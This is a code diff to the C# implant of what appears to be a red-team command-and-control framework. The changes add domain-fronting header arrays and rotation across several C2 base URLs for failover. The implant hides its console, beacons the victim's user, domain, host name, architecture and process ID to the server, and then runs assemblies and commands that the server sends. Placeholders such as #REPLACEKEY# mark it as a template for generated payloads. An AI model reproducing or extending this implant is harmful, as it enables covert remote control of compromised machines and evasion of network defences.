@@ -25,6 +25,11 @@ public class Program
     public static string taskId;
     private static string pKey;
 
+    private static int dfs = 0;
+	private static string[] dfarray = {#REPLACEDF#};
+	public static string[] dfhead = null;
+	private static string[] basearray = {#REPLACEBASEURL#};
+	public static string[] rotate = null;
 	public static void Sharp()
 	{
 		var handle = GetConsoleWindow();
@@ -96,7 +101,7 @@ public class Program
 				x.Proxy.Credentials = CredentialCache.DefaultCredentials;
 		}
 
-		var df = "#REPLACEDF#";
+		var df = dfarray[dfs].Replace("\"", String.Empty).Trim(); 
 		if (!String.IsNullOrEmpty(df))
 			x.Headers.Add("Host", df);
 
@@ -211,12 +216,24 @@ public class Program
 			var arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
 			int pid = Process.GetCurrentProcess().Id;
 			Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
-			var o = String.Format("{0};{1};{2};{3};{4};#REPLACEURLID#", dn, u, cn, arch, pid);
-			String key = "#REPLACEKEY#", baseURL = "#REPLACEBASEURL#", s = "#REPLACESTARTURL#";
-
-			var primer = GetWebRequest(Encryption(key, o)).DownloadString(s);
-			var x = Decryption(key, primer);
-
+			string x = null;
+			string baseURL = null;
+			foreach (string du in Program.basearray)
+			{
+				var o = String.Format("{0};{1};{2};{3};{4};#REPLACEURLID#", dn, u, cn, arch, pid);
+			 	string key = "#REPLACEKEY#";
+			 	baseURL = du;
+			 	string s = baseURL+"#REPLACESTARTURL#"; 
+				try {
+				var primer = GetWebRequest(Encryption(key, o)).DownloadString(s);
+				x = Decryption(key, primer);
+				}
+				catch (Exception e){}
+				if (x !=null){
+					break;
+				}
+				dfs++;
+			}
 			var re = new Regex("RANDOMURI19901(.*)10991IRUMODNAR");
 			var m = re.Match(x);
 			string RandomURI = m.Groups[1].ToString();
@@ -367,6 +384,14 @@ public class Program
 		internal static String GenerateUrl()
 		{
 			string URL = _stringnewURLS[_rnd.Next(_stringnewURLS.Count)];
+			if (Program.rotate != null)
+			{
+				Random random = new Random();
+				int pos = random.Next(0, Program.rotate.Length);
+				_baseUrl = rotate[pos].Replace("\"", String.Empty).Trim();
+				Program.dfarray = Program.dfhead;
+				Program.dfs = pos;
+			}
 			return String.Format("{0}/{1}{2}/?{3}", _baseUrl, URL, Guid.NewGuid(), _randomURI);
 		}
 	}	
@@ -492,9 +517,9 @@ public class Program
 						else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
 						{
 							Thread t = new Thread(() => rAsm(cmd));
-							t.Start();
 							Exec("[+] Running background task", taskId, Key);
-						}						
+							t.Start();
+						}					
 						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
 						{
 							output.AppendLine(rAsm(cmd));
@@ -515,7 +540,7 @@ public class Program
 						}
 						else 
 						{
-							var sHot = rAsm($"run-exe Core.Program Core {cmd}");							
+							var sHot = rAsm($"run-exe Core.Program Core {cmd}");
 						}	
 						output.AppendLine(strOutput.ToString());
 						var sb = strOutput.GetStringBuilder();
